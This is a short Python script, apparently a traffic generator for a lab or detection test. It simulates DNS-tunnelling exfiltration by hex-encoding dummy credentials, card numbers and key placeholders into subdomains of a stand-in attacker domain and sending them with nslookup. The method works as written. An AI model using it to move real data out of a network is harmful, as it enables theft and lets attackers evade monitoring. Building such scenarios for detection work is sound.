import argparse
import time
import subprocess
import random

def run_dns_tunneling(target_ip: str, target_port: int, domain: str, num_queries: int):
    print(f"[*] Starting DNS Tunneling Scenario against {target_ip}:{target_port}")
    print(f"[*] Simulating exfiltration to '{domain}'...\n")

    # Dummy data to exfiltrate
    secret_data = [
        "user:admin,password:supersecret123",
        "credit_card:4111-2222-3333-4444,cvv:123",
        "ssh_key:BEGIN_RSA_PRIVATE_KEY_...",
        "db_dump:users_table_row_1_to_1000",
        "confidential_project_x_details_and_specs"
    ]

    for i in range(num_queries):
        # Pick random data, add some random padding to make it unique, and encode it
        raw_string = f"{random.choice(secret_data)}_salt_{random.randint(1000,9999)}"
        
        # Hex encoding is common for DNS to avoid invalid characters
        encoded_data = raw_string.encode().hex()
        
        # Construct the full tunneling query: <encoded_data>.attacker.com
        # DNS labels max length is 63 chars, we chunk it into 60-char labels
        chunks = [encoded_data[j:j+60] for j in range(0, len(encoded_data), 60)]
        subdomain = ".".join(chunks)
        
        full_query = f"{subdomain}.{domain}"
        
        print(f"[{i+1}/{num_queries}] Exfiltrating: {raw_string}")
        print(f"    -> Query: {full_query}")
        
        try:
            # Use nslookup to send the query to our specific DNS server
            # nslookup -port=<port> <query> <server_ip>
            # We need to use the same exact hostname of the container on the Docker net
            subprocess.run(
                ["nslookup", f"-port={target_port}", full_query, target_ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2
            )
        except Exception as e:
            print(f"    [-] Query failed: {e}")
            
        time.sleep(1)

    print("\n[*] Scenario completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Tunneling Scenario Generator")
    parser.add_argument("--target", required=True, help="Target DNS Server IP address")
    parser.add_argument("--port", type=int, default=53, help="Target DNS port (default: 53)")
    parser.add_argument("--domain", default="malicious-c2.com", help="Attacker controlled domain")
    parser.add_argument("--queries", type=int, default=5, help="Number of queries to send")

    args = parser.parse_args()
    run_dns_tunneling(args.target, args.port, args.domain, args.queries)
